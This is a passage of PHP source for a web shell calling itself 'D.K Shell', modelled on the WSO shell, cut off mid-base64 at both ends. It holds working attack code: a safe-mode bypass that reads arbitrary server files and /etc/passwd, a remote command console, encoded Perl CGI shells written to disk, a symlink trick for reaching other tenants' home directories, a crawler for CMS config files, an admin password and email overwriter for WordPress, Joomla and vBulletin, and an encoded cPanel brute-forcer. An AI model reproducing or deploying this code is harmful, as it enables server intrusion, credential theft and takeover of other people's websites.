25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRwYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpICMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kDQp7DQoJJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCSZEb3dubG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAjIHVzZXIgd2FudHMgdG8gbG9nb3V0DQp7DQoJJlBlcmZvcm1Mb2dvdXQ7DQp9DQo=');
$write = fwrite ($file ,$sa);

chmod($dir."dkcgi/dz.sa" , 0755);
chmod($dir."dkcgi/cgi.pl" , 0755);
	 
	 
	 
	$temp='';
	ob_start();
	switch($_POST['p1']) {
		case 1:
			$temp=@tempnam($test, 'cx');
			if(@copy("compress.zlib://".$_POST['p2'], $temp)){
				echo @file_get_contents($temp);
				unlink($temp);
			} else
				echo 'Sorry... Can\'t open file';
			break;
		case 2:
			$files = glob($_POST['p2'].'*');
			if( is_array($files) )
				foreach ($files as $filename)
					echo $filename."
";
			break;
		case 3:
			$ch = curl_init("file://".$_POST['p2']."".preg_replace('!\(\d+\)\s.*!', '', __FILE__));
			curl_exec($ch);
			break;
		case 4:
			ini_restore("safe_mode");
			ini_restore("open_basedir");
			include($_POST['p2']);
			break;
		case 5:
			for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
				$uid = @posix_getpwuid($_POST['p2']);
				if ($uid)
					echo join(':',$uid)."
";
			}
			break;
	}
	$temp = ob_get_clean();
	wsoHeader();
	
	echo '<h1>Safe mode bypass</h1><div class=content>';
	echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
	if($temp)
		echo '<pre class="ml1" style="margin-top:5px" id="Output">'.htmlspecialchars($temp).'</pre>';
	echo '</div>';
	echo "<center><a href=/dkcgi/cgi.pl>cgi script 1</a><br />";
	echo "<a href=/dkcgi/dz.sa>cgi script 2</a><br /></center>";
	wsoFooter();
}

function actionConsole() {
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		echo "document.cf.cmd.value='';
";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("
$ ".$_POST['p1']."
".wsoEx($_POST['p1']),"

	\'"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
			}
		}
		echo "document.cf.output.value+='".$temp."';";
		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "
", $temp;
		exit;
	}
	wsoHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>";
	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."
".wsoEx($_POST['p1']));
	}
	echo '</textarea><input type=text name=cmd style="border-top:0;width:100%;margin:0;" onkeydown="kp(event);">';
	echo '</form></div><script>document.cf.cmd.focus();</script>';
	wsoFooter();
}

function actionLogout() {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	die('bye!');
}

function actionSelfRemove() {

	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        wsoHeader();
	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	wsoFooter();
}


function actionsymlink() {
wsoHeader();
$IIIIIIIIIIIl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];



	
	@mkdir('dk',0777);
$IIIIIIIIIIl1  = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
$IIIIIIIIII1I =@fopen ('dk/.htaccess','w');
@fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
@symlink('/','dk/root');
$IIIIIIIIIlIl = basename('_FILE_');
  
$file = @implode(@file("/etc/named.conf"));
$rile = @implode(@file("dk/root/etc/named.conf"));
if(!$file & !$rile){ echo("# can't ReaD -> [ /etc/named.conf ]<br></br>Try changing the shell chmod values to 0755..!!<br />Try copying the shell to the web directory..!!"); wsoFooter();}
if(!$file & $rile){$file = $rile;}
preg_match_all("#named/(.*?).db#",$file ,$r);

$domains = array_unique($r[1]);



echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td>Count:</td><td>Domain</td><td>User</td><td>Symlink</td><td>crawl</td></tr>";
$redf=0;
foreach($domains as $domain){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
$redf++;
echo "<tr><td>$redf</td><td>$domain</td><td>".$user['name']."</td><td><a href='dk/root/home/".$user['name']."/public_html' target='_blank'>$domain </a></td>";
//echo "<td><form onsubmit=\"g('crawl',null,null,this.k.value);return false;\"><input type=submit name=k value='>></tr>";
echo '<td><script>p1_=p2_=p3_="";</script><a href=# onclick="g(\'crawl\',null,null,null,\''.$domain.'\')">Crawl </a></td></tr>';
}

echo "</table>";
	
	wsoFooter();
}

function actionpasschanger() {

if(isset($_POST['p3']))
 {
 $domainn = $_POST['p3'];
$thelinks = explode("}", $domainn);
$thelink = $thelinks[0];
$isjoomla = $thelinks[1];
$domain2 = $thelinks[2];
wsoHeader();
if ($isjoomla == "wp")
{
$db = "define('DB_NAME', ";
$user = "define('DB_USER', "; 
$password = "define('DB_PASSWORD', ";
$thecontent = file_get_contents($thelink);
//
$extracted = strpos($thecontent, $db);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$db = $extracted[3];
//echo $db;
$extracted = strpos($thecontent, $user);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$user = $extracted[3];
//echo $user;
$extracted = strpos($thecontent, $password);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$password = $extracted[3];
//echo $password;


mysql_connect("localhost", $user, $password) or die(mysql_error());
echo "<br/><center>Connected to MySQL<br /><br />";
mysql_select_db($db) or die(mysql_error());
echo "Connected to Database<br/>";
$result = mysql_query("UPDATE wp_users SET user_pass='\$P\$BmYX817viHAgyI7PxtgRZ7vOXmQU3M1' WHERE user_login='admin'"); 
$result1 = mysql_query("UPDATE wp_users SET user_pass='\$P\$BmYX817viHAgyI7PxtgRZ7vOXmQU3M1' WHERE ID='1'");
$result2 = mysql_query("UPDATE wp_users SET user_pass='\$P\$BmYX817viHAgyI7PxtgRZ7vOXmQU3M1' WHERE ID='2'");
$result3 = mysql_query("UPDATE wp_users SET user_pass='\$P\$BmYX817viHAgyI7PxtgRZ7vOXmQU3M1' WHERE ID='3'");


$result4 = mysql_query("UPDATE wp_users SET user_email='interestingpal@gmail.com' WHERE user_login='admin'");
$result5 = mysql_query("UPDATE wp_users SET  WHERE user_login='Admin'");

$result6 = mysql_query("UPDATE wp_users SET user_pass='\$P\$BmYX817viHAgyI7PxtgRZ7vOXmQU3M1' WHERE user_email='interestingpal@gmail.com'");

$query25 = mysql_query("SELECT * FROM wp_users WHERE user_pass='\$P\$BmYX817viHAgyI7PxtgRZ7vOXmQU3M1'");



$row25 = mysql_fetch_array( $query25 );

echo "<br/><br/>The Password is <b>root</b> for the usernames given below ::<br/><br/>";

echo "<b><a href=http://www.".$domain2.">".$row25['user_login']."</a></b>  <br/>";


}
elseif ($isjoomla == "jm")
{
$db = 'var $db =';
$user = 'var $user ='; 
$password = 'var $password =';
$thecontent = file_get_contents($thelink);
//
$extracted = strpos($thecontent, $db);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$db = $extracted[1];
//echo $db;
$extracted = strpos($thecontent, $user);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$user = $extracted[1];
//echo $user;
$extracted = strpos($thecontent, $password);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$password = $extracted[1];
//echo $password;
mysql_connect("localhost", $user, $password) or die(mysql_error());
echo "<br/><center>Connected to MySQL<br /><br />";
mysql_select_db($db) or die(mysql_error());
echo "Connected to Database<br/>";

// Insert a row of information into the table "example"
//mysql_query("INSERT INTO jos_users(name, username) VALUES('dkshell', 'dkshell' ) ") or die(mysql_error());
$result = mysql_query("UPDATE jos_users SET password='f0c337805362f5d3a6995004e3bbeb20:MnWvL1zEDGvLg8VlJ83Owjsl2SCtvSfF' WHERE gid='24'"); 
//$query24 = mysql_query("SELECT * FROM jos_users WHERE gid='24'");


$result = mysql_query("UPDATE jos_users SET password='f0c337805362f5d3a6995004e3bbeb20:MnWvL1zEDGvLg8VlJ83Owjsl2SCtvSfF' WHERE gid='25'");
//$query25 = mysql_query("SELECT * FROM jos_users WHERE gid='25'");

 
$result = mysql_query("UPDATE jos_users SET password='f0c337805362f5d3a6995004e3bbeb20:MnWvL1zEDGvLg8VlJ83Owjsl2SCtvSfF' WHERE gid='26'");
//$query26 = mysql_query("SELECT * FROM jos_users WHERE gid='26'");

$result = mysql_query("UPDATE jos_users SET password='f0c337805362f5d3a6995004e3bbeb20:MnWvL1zEDGvLg8VlJ83Owjsl2SCtvSfF' WHERE username='admin'"); 
$result = mysql_query("UPDATE jos_users SET email='interestingpal@gmail.com' WHERE username='admin'");
$result = mysql_query("UPDATE jos_users SET password='f0c337805362f5d3a6995004e3bbeb20:MnWvL1zEDGvLg8VlJ83Owjsl2SCtvSfF' WHERE username='Admin'");
//$result = mysql_query("UPDATE jos_users SET block='0' WHERE name='dkshell'") or die(mysql_error());
//$result = mysql_query("UPDATE jos_users SET usertype='Super Administrator' WHERE name='dkshell'") or die(mysql_error());
//$result = mysql_query("UPDATE jos_users SET sendEmail='1' WHERE name='dkshell'") or die(mysql_error());
//$result = mysql_query("UPDATE jos_users SET gid='25' WHERE name='dkshell'") or die(mysql_error());
//$result = mysql_query("UPDATE jos_users SET registerDate='2012-02-24 17:20:44' WHERE name='dkshell'") or die(mysql_error());
//$result = mysql_query("UPDATE jos_users SET lastvisitDate='0000-00-00 00:00:00' WHERE name='dkshell'") or die(mysql_error());
//$result = mysql_query("SELECT * FROM jos_users WHERE name='daryl'") or die(mysql_error());  

// get the first (and hopefully only) entry from the result

$query25 = mysql_query("SELECT * FROM jos_users WHERE password='f0c337805362f5d3a6995004e3bbeb20:MnWvL1zEDGvLg8VlJ83Owjsl2SCtvSfF'");
$row25 = mysql_fetch_array( $query25 );

echo "<br/><br/>The Password is <b>root</b> for the usernames given below ::<br/><br/>";
echo "<b><a href=http://www.".$domain2.">".$row25['username']."</b>  <br/></center>";

}
elseif ($isjoomla == "vb")
{
$db = "config['Database']['dbname'] = '";
$user = "config['MasterServer']['username'] = '"; 
$password = "config['MasterServer']['password'] = '";
$thecontent = file_get_contents($thelink);
//
$extracted = strpos($thecontent, $db);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$db = $extracted[5];
//echo $db;
$extracted = strpos($thecontent, $user);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$user = $extracted[5];
//echo $user;
$extracted = strpos($thecontent, $password);
$extracted = substr($thecontent, $extracted, 50);
$extracted = explode("'", $extracted);
$password = $extracted[5];
//echo $password;


mysql_connect("localhost", $user, $password) or die(mysql_error());
echo "<br/><center>Connected to MySQL<br /><br />";
mysql_select_db($db) or die(mysql_error());
echo "Connected to Database<br/>";


$result = mysql_query("UPDATE user SET password='32c07513a635525a9eca5389e9bb3203' WHERE usertitle='Administrator'");
$result = mysql_query("UPDATE user SET salt='<(@]M=wj4Ew/k`*f{o6sK!5:l5Z?xE' WHERE usertitle='Administrator'"); 
$result = mysql_query("UPDATE user SET email='interestingpal@gmail.com' WHERE usertitle='Administrator'");
$result = mysql_query("UPDATE user SET password='32c07513a635525a9eca5389e9bb3203' WHERE userid='1'");
$result = mysql_query("UPDATE user SET salt='<(@]M=wj4Ew/k`*f{o6sK!5:l5Z?xE' WHERE userid='1'");


$query25 = mysql_query("SELECT * FROM user WHERE password='32c07513a635525a9eca5389e9bb3203'");



$row25 = mysql_fetch_array( $query25 );

echo "<br/><br/>The Password is <b>McK7jjBq</b> for the usernames given below ::<br/><br/>";

echo "<b><a href=http://www.".$domain2.">".$row25['username']."</a></b>  <br/>";

}
else
{
} 
}

wsoFooter();





}

function actioncrawl() {
wsoHeader();
$IIIIIIIIIIIl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$IIIIIIIIIII1=explode('/',$IIIIIIIIIIIl );
$IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1)-1],'',$IIIIIIIIIIIl ); 
$isjoomla = "0";
 if(isset($_POST['p3']))
 {
 $domainn = $_POST['p3'];

 $userr = posix_getpwuid(@fileowner("/etc/valiases/".$domainn));

echo "<table align='center' width='40%' class='main' ><tr><td> Results: </td></tr>";

$IIIIIIIII1l1=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/wp-config.php';
$IIIIIIIII11I=get_headers($IIIIIIIII1l1);
$IIIIIIIII11l=$IIIIIIIII11I[0];
$IIIIIIIII111=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/blog/wp-config.php';
$IIIIIIIIlIII=get_headers($IIIIIIIII111);
$IIIIIIIIlIIl=$IIIIIIIIlIII[0];
$IIIIIIIIlII1=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/configuration.php';
$IIIIIIIIlIlI=get_headers($IIIIIIIIlII1);
$IIIIIIIIlIll=$IIIIIIIIlIlI[0];
$IIIIIIIIlIl1=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/joomla/configuration.php';
$IIIIIIIIlI1I=get_headers($IIIIIIIIlIl1);
$IIIIIIIIlI1l=$IIIIIIIIlI1I[0];
$IIIIIIIIlI11=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/includes/config.php';
$IIIIIIIIllII=get_headers($IIIIIIIIlI11);
$IIIIIIIIllIl=$IIIIIIIIllII[0];
$IIIIIIIIllI1=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/vb/includes/config.php';
$IIIIIIIIlllI=get_headers($IIIIIIIIllI1);
$IIIIIIIIllll=$IIIIIIIIlllI[0];
$IIIIIIIIlll1=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/forum/includes/config.php';
$IIIIIIIIll1I=get_headers($IIIIIIIIlll1);
$IIIIIIIIll1l=$IIIIIIIIll1I[0];
$IIIIIIIIll11=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'public_html/clients/configuration.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIll11);
$IIIIIIIIl1Il=$IIIIIIIIl1II[0];
$IIIIIIIIl1I1=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/support/configuration.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIl1I1);
$IIIIIIIIl1lI=$IIIIIIIIl1II[0];
$IIIIIIIIl1ll=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/client/configuration.php';
$IIIIIIIIl1l1=get_headers($IIIIIIIIl1ll);
$IIIIIIIIl11I=$IIIIIIIIl1l1[0];
$IIIIIIIIl11l=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/submitticket.php';
$IIIIIIIIl111=get_headers($IIIIIIIIl11l);
$IIIIIIII1III=$IIIIIIIIl111[0];
$IIIIIIII1IIl=$IIIIIIIIIIIl.'/dk/root/home/'.$userr['name'].'/public_html/client/configuration.php';
$IIIIIIII1II1=get_headers($IIIIIIII1IIl);
$IIIIIIII1IlI=$IIIIIIII1II1[0];
$IIIIIIII1Ill = strpos($IIIIIIIII11l,'200');
$IIIIIIII1I1I='&nbsp;';
if (strpos($IIIIIIIII11l,'200') == true )
{
$IIIIIIII1I1I="<td><a href='".$IIIIIIIII1l1."' target='_blank'>".$domainn." [Wordpress]</a></td>";
$isjoomla = "wp";
$thelink = $IIIIIIIII1l1;
$domain2 = $domainn . '/wp-login.php';
}
elseif (strpos($IIIIIIIIlIIl,'200') == true)
{
$IIIIIIII1I1I="<td><a href='".$IIIIIIIII111."' target='_blank'>".$domainn." [Wordpress]</a></td>";
$isjoomla = "wp";
$thelink = $IIIIIIIII111;
$domain2 = $domainn . '/blog/wp-login.php';
}
elseif (strpos($IIIIIIIIlIll,'200')  == true and strpos($IIIIIIII1III,'200')  == true )
{
$IIIIIIII1I1I="<td> <a href='".$IIIIIIIIl11l."' target='_blank'>".$domainn." [WHMCS]</a></td>";
}
elseif (strpos($IIIIIIIIl1lI,'200')  == true)
{
$IIIIIIII1I1I ="<td> <a href='".$IIIIIIIIl1I1."' target='_blank'>".$domainn." [WHMCS]</a></td>";
}
elseif (strpos($IIIIIIIIl11I,'200')  == true)
{
$IIIIIIII1I1I =" <td><a href='".$IIIIIIIIl1ll."' target='_blank'>".$domainn." [WHMCS]</a></td>";
}
elseif (strpos($IIIIIIIIlIll,'200')  == true)
{
$IIIIIIII1I1I="<td> <a href='".$IIIIIIIIlII1."' target='_blank'>".$domainn." [Joomla]</a></td>";
$isjoomla = "jm";
$thelink = $IIIIIIIIlII1;
$domain2 = $domainn . '/administrator/';
}
elseif (strpos($IIIIIIIIlI1l,'200')  == true)
{
$IIIIIIII1I1I="<td> <a href='".$IIIIIIIIlIl1."' target='_blank'>".$domainn." [Joomla]</a></td>";
$isjoomla = "jm";
$thelink = $IIIIIIIIlIl1;
$domain2 = $domainn . '/joomla/administrator/';
}
elseif (strpos($IIIIIIIIllIl,'200')  == true)
{
$IIIIIIII1I1I="<td> <a href='".$IIIIIIIIlI11."' target='_blank'>".$domainn." [vBulletin]</a></td>";
$isjoomla = "vb";
$thelink = $IIIIIIIIlI11;
$domain2 = $domainn;
}
elseif (strpos($IIIIIIIIllll,'200')  == true)
{
$IIIIIIII1I1I="<td> <a href='".$IIIIIIIIllI1."' target='_blank'>".$domainn." [vBulletin]</a></td>";
$isjoomla = "vb";
$thelink = $IIIIIIIIllI1;
$domain2 = $domainn;
}
elseif (strpos($IIIIIIIIll1l,'200')  == true)
{
$IIIIIIII1I1I="<td> <a href='".$IIIIIIIIlll1."' target='_blank'>".$domainn." [vBulletin]</a></td>";
$isjoomla = "vb";
$thelink = $IIIIIIIIlll1;
$domain2 = $domainn;
}
else
{
//continue;
$IIIIIIII1I1l = $userr ;
$IIIIIIII1I1I='<tr><td><a href=/dk/root/home/'.$userr['name'].'/public_html/>'.$domainn.'[Custom Website]</a></td><td></td></tr>';
}
echo $IIIIIIII1I1I;
}

echo "</center></table><br></br><br><br>";  
$saying = $thelink . '}' . $isjoomla . '}' . $domain2;
if ($isjoomla == "wp" || $isjoomla == "vb" || $isjoomla == "jm")
{
 echo '<center><h3><b><script>p1_=p2_=p3_="";</script><a href=# onclick="g(\'passchanger\',null,null,null,\''.$saying.'\')"> [Change Password] </a></b></center></h3>';   
}

wsoFooter();
}

function actionabout() {
wsoHeader();
echo '<div class=header>  ';

    echo "<pre>

	
	                                      D.K Shell v1.0
										  
	  
	                       D.K Shell (c)oded by b47chguru & Lnx Root for ICF
	
          D.K shell is made on the same architecture of WSO shell. D.K shell is a professional web shell..
	  It has all the features to bust the security..including disabling mod_security , disabling php safe mode,
	  Symlink,webcrawler, auto-admin password changer for vbulletin,joomla,Wordpress...etc,
	  perl cgi scipt compatibility and a better backconnection script.For any doubts or queries on D.K shell
	  mail me at interestingpal@gmail.com
       Note:The security on the webserver is completely disabled when clicked on the 'safemode' link and the default port for php backconnection is 70
	  
		Special Thanks to Archith Kp who helped generously throughout the project..!!
				
				
				
				
	 </pre></div>";
wsoFooter();
}
function actionBruteforce() {
	wsoHeader();
	
	
	

$file = fopen($dir."dkcpanel.php" ,"w+");
$sa=base64_decode('PD9waHANCiRjcGFuZWxfcG9ydD0iMjA4MiI7DQokY29ubmVjdF90aW1lb3V0PTU7DQpzZXRfdGltZV9saW1pdCgwKTsNCiRzdWJtaXQ9JF9SRVFVRVNUWydzdWJtaXQnXTsNCiR1c2Vycz0kX1JFUVVFU1RbJ3VzZXJzJ107DQokcGFzcz0kX1JFUVVFU1RbJ3Bhc3N3b3JkcyddOw0KJHRhcmdldD0kX1JFUVVFU1RbJ3RhcmdldCddOw0KJGNyYWNrdHlwZT0kX1JFUVVFU1RbJ2NyYWNrdHlwZSddOw0KaWYoJHRhcmdldCA9PSAiIil7DQokdGFyZ2V0ID0gImxvY2FsaG9zdCI7DQp9DQokY2hhcnNldD0kX1JFUVVFU1RbJ2NoYXJzZXQnXTsNCmlmKCRjaGFyc2V0PT0iIikNCiAkY2hhcnNldD0ibG93ZXJjYXNlIjsNCiRtYXhfbGVuZ3RoPSRfUkVRVUVTVFsnbWF4X2xlbmd0aCddOw0KaWYoJG1heF9sZW5ndGg9PSIiKQ0KICRtYXhfbGVuZ3RoPTEwOw0KJG1pbl9sZW5ndGg9JF9SRVFVRVNUWydtaW5fbGVuZ3RoJ107DQppZigkbWluX2xlbmd0aD09IiIpDQogJG1pbl9sZW5ndGg9MTsNCg0KICRjaGFyc2V0YWxsID0gYXJyYXkoImEiLCAiYiIsICJjIiwgImQiLCAiZSIsICJmIiwgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwgIm0iLCAibiIsICJvIiwgInAiLCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4IiwgInkiLCAieiIsICJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiLCAiMCIsICIxIiwgIjIiLCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSIpOw0KICRjaGFyc2V0bG93ZXIgPSBhcnJheSgiYSIsICJiIiwgImMiLCAiZCIsICJlIiwgImYiLCAiZyIsICJoIiwgImkiLCAiaiIsICJrIiwgImwiLCAibSIsICJuIiwgIm8iLCAicCIsICJxIiwgInIiLCAicyIsICJ0IiwgInUiLCAidiIsICJ3IiwgIngiLCAieSIsICJ6Iik7DQogJGNoYXJzZXR1cHBlciA9IGFycmF5KCJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiKTsNCiAkY2hhcnNldG51bWVyaWMgPSBhcnJheSgiMCIsICIxIiwgIjIiLCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSIpOw0KICRjaGFyc2V0bG93ZXJudW1lcmljID0gYXJyYXkoImEiLCAiYiIsICJjIiwgImQiLCAiZSIsICJmIiwgImciLCAiaCIsICJpIiwgImoiLCAiayIsICJsIiwgIm0iLCAibiIsICJvIiwgInAiLCAicSIsICJyIiwgInMiLCAidCIsICJ1IiwgInYiLCAidyIsICJ4IiwgInkiLCAieiIsICIwIiwgIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjciLCAiOCIsICI5Iik7DQogJGNoYXJzZXR1cHBlcm51bWVyaWMgPSBhcnJheSgiQSIsICJCIiwgIkMiLCAiRCIsICJFIiwgIkYiLCAiRyIsICJIIiwgIkkiLCAiSiIsICJLIiwgIkwiLCAiTSIsICJOIiwgIk8iLCAiUCIsICJRIiwgIlIiLCAiUyIsICJUIiwgIlUiLCAiViIsICJXIiwgIlgiLCAiWSIsICJaIiwgIjAiLCAiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiKTsNCiAkY2hhcnNldGxldHRlcnMgPSBhcnJheSgiYSIsICJiIiwgImMiLCAiZCIsICJlIiwgImYiLCAiZyIsICJoIiwgImkiLCAiaiIsICJrIiwgImwiLCAibSIsICJuIiwgIm8iLCAicCIsICJxIiwgInIiLCAicyIsICJ0IiwgInUiLCAidiIsICJ3IiwgIngiLCAieSIsICJ6IiwgIkEiLCAiQiIsICJDIiwgIkQiLCAiRSIsICJGIiwgIkciLCAiSCIsICJJIiwgIkoiLCAiSyIsICJMIiwgIk0iLCAiTiIsICJPIiwgIlAiLCAiUSIsICJSIiwgIlMiLCAiVCIsICJVIiwgIlYiLCAiVyIsICJYIiwgIlkiLCAiWiIgKTsNCiAkY2hhcnNldHN5bWJvbHM9IGFycmF5KCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldGxvd2Vyc3ltYm9scyA9IGFycmF5KCJhIiwgImIiLCAiYyIsICJkIiwgImUiLCAiZiIsICJnIiwgImgiLCAiaSIsICJqIiwgImsiLCAibCIsICJtIiwgIm4iLCAibyIsICJwIiwgInEiLCAiciIsICJzIiwgInQiLCAidSIsICJ2IiwgInciLCAieCIsICJ5IiwgInoiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldHVwcGVyc3ltYm9scyA9IGFycmF5KCJBIiwgIkIiLCAiQyIsICJEIiwgIkUiLCAiRiIsICJHIiwgIkgiLCAiSSIsICJKIiwgIksiLCAiTCIsICJNIiwgIk4iLCAiTyIsICJQIiwgIlEiLCAiUiIsICJTIiwgIlQiLCAiVSIsICJWIiwgIlciLCAiWCIsICJZIiwgIloiLCIhIiwgIkAiLCAiIyIsICIkIiwgIiUiLCAiXiIsICImIiwgIioiLCAiKCIsICIpIiwiXyIgKTsNCiAkY2hhcnNldGxldHRlcnNzeW1ib2xzID0gYXJyYXkoImEiLCAiYiIsICJjIiwgImQiLCAiZSIsICJmIi